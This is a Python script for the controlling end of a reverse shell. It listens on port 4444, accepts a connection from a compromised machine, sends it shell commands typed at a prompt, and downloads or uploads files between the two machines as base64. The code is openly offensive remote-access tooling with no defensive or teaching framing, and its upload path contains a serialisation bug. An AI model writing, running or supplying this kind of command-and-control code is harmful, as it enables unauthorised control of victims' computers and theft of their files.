import socket 
import json
import base64

def server(ip,port):
    global target
    lisnr = socket.socket(socket.AF_INET,socket.SOCK_STREAM)
    lisnr.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    lisnr.bind((ip,port))
    lisnr.listen(0)
    print('[*]Listening...')
    target, address =lisnr.accept()
    print(f"[+]Established connection : {address}")

def send(data):
    json_data=json.dumps(data)
    target.send(json_data.encode('utf-8'))

def recieve():
    json_data= ''
    while True:
        try:
            json_data += target.recv(1024).decode('utf-8')
            return json.loads(json_data)
        except ValueError:
            continue

def run():
    while True:
        cmd = input('Shell#: ')
        send(cmd)
        if cmd == 'exit':
            break
        elif cmd[:2] == 'cd' and len(cmd)>1:
            continue
        elif cmd[:8] == 'download':
            with open(cmd[9:],'wb') as f:
                file_data = recieve()
                f.write(base64.b64decode(file_data))
        elif cmd[:6] == 'upload':
            with open(cmd[7:],'rb') as f:
                send(base64.b64encode(f.read()))
        else:
            result = recieve().encode('utf-8')
            print(result.decode('utf-8'))

server('192.168.1.6',4444)
run()